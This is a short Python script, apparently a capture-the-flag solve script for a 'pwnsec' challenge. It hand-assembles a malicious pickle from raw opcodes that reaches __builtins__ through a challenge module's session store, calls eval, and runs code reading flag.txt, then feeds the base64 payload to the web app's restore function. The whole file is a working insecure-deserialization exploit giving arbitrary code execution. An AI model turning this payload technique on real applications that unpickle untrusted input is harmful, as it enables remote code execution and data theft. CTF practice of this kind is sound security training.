import io
import pickle
import sys
import os
os.chdir(r'c:\Users\ACER\Downloads\ctf\ctf pwnsec\challenge')
sys.path.insert(0, r'c:\Users\ACER\Downloads\ctf\ctf pwnsec\challenge')
import webapp
import base64

eval_str = "".join(f"\\x{b:02x}" for b in b"eval")
code = 'print("HELLO_FROM_EXPLOIT", open("flag.txt").read())'
code_str = "".join(f"\\x{b:02x}" for b in code.encode())

p = bytearray()
p.extend(b"(")
p.extend(b"isessionstore\nCapsule\n")
p.extend(b"(")
p.extend(b"S'cache'\n")
p.extend(b"csessionstore\n__builtins__\n")
p.extend(b"d")
p.extend(b"b")
p.extend(b"p0\n")
p.extend(b"0")
p.extend(b"(")
p.extend(b"(")
p.extend(b"g0\n")
p.extend(f"S'{eval_str}'\n".encode())
p.extend(b"isessionstore\nrender\n")
p.extend(f"S'{code_str}'\n".encode())
p.extend(b"o")

b64 = base64.b64encode(p).decode()
output, dis = webapp.restore(b64)
print("=== Output from restore ===")
print(output)
